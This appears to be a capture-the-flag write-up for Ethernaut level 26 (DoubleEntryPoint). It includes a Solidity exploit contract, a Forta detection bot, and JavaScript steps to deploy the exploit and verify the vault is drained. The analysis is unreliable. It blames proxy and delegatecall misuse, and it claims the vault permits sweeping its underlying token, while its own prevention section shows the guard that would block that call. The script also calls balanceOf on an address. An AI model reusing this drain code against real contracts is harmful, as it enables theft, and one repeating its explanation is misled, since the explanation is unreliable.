# Ethernaut #26 — DoubleEntryPoint

## Date
2026-02-01

## Status
🔬 Theory Complete | ⏳ Execution Pending (no gas)

## The Vulnerability

**DoubleEntryPoint** demonstrates a critical ERC20 token vulnerability: **double-spending via proxy/delegate patterns**.

### Core Pattern

When a token contract uses a proxy pattern with `delegatecall`, the storage layout can be exploited if not carefully managed. The vulnerability typically involves:

1. **Proxy Contract** - Holds the state/storage
2. **Implementation Contract** - Contains the logic
3. **Delegatecall Abuse** - Attacker can manipulate state in unintended ways

### The Double-Spend Vector

```
┌─────────────────┐         ┌──────────────────┐
│  Token Proxy    │────────▶│  Implementation  │
│  (Storage)      │delegate │  (Logic)         │
└─────────────────┘  call   └──────────────────┘
         │                            │
         │                            │
         ▼                            ▼
   Attacker calls                Function executes
   proxy with                    using proxy's
   crafted data                  storage context
```

## Attack Strategy

The attack exploits the separation between:
- Token balances stored in proxy
- Logic executed in implementation
- Potential for reentrancy or double-approval

### Key Exploit Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDoubleEntryPoint {
    function cryptoVault() external view returns (address);
    function forta() external view returns (address);
    function delegatedFrom() external view returns (address);
}

interface ICryptoVault {
    function underlying() external view returns (address);
    function sweptTokensRecipient() external view returns (address);
    function sweepToken(address token) external;
}

interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function raiseAlert(address user) external;
}

contract DoubleEntryPointExploit {
    IDoubleEntryPoint public target;
    
    constructor(address _target) {
        target = IDoubleEntryPoint(_target);
    }
    
    // The exploit path:
    // 1. Identify that the CryptoVault can sweep tokens
    // 2. The sweepToken function can be exploited if it doesn't
    //    properly check the token being swept
    // 3. Call sweepToken with the underlying token address
    // 4. This drains the vault due to missing validation
    
    function exploit() external {
        ICryptoVault vault = ICryptoVault(target.cryptoVault());
        
        // Sweep the underlying token - this shouldn't be allowed
        // but the vault doesn't prevent sweeping its own underlying token
        vault.sweepToken(vault.underlying());
    }
}

// Detection Bot for Forta monitoring
contract DetectionBot {
    address public cryptoVault;
    
    constructor(address _cryptoVault) {
        cryptoVault = _cryptoVault;
    }
    
    // Monitor for large transfers from the vault
    function handleTransaction(
        address user,
        bytes calldata msgData
    ) external {
        // Decode and check for suspicious patterns
        // Raise alert if exploit pattern detected
        
        // The actual Forta bot would analyze msgData
        // for the sweepToken call pattern
        
        (address to, uint256 value, address origSender) = 
            abi.decode(msgData[4:], (address, uint256, address));
            
        if (origSender == cryptoVault) {
            IForta(msg.sender).raiseAlert(user);
        }
    }
}
```

## The Lesson

### Prevention

1. **Proper Access Controls**
   ```solidity
   function sweepToken(address token) external {
       require(token != underlying(), "Cannot sweep underlying");
       // ... rest of function
   }
   ```

2. **Input Validation**
   - Always validate token addresses
   - Never allow sweeping the contract's own core token

3. **Proxy Pattern Safety**
   - Careful storage layout management
   - Clear separation of concerns
   - Proper initialization checks

## Exploit Steps (When Funded)

```javascript
// 1. Deploy exploit contract
const Exploit = await ethers.getContractFactory("DoubleEntryPointExploit");
const exploit = await Exploit.deploy(targetAddress);

// 2. Execute exploit
await exploit.exploit();

// 3. Verify vault drained
const underlying = await vault.underlying();
const balance = await underlying.balanceOf(vault.address);
assert(balance === 0, "Vault not drained");

// 4. For Forta detection bot challenge:
const DetectionBot = await ethers.getContractFactory("DetectionBot");
const bot = await DetectionBot.deploy(vaultAddress);
await forta.setDetectionBot(bot.address);
```

## Impact

- **Severity**: Critical
- **Type**: Access Control + Logic Error
- **Result**: Complete vault drainage
- **Real-world**: Similar patterns have led to millions in DeFi exploits

## References

- Ethernaut Level 26
- OpenZeppelin Proxy Patterns
- Forta Network Detection Bots

---
*Documented: 2026-02-01 | Execution pending gas funding*
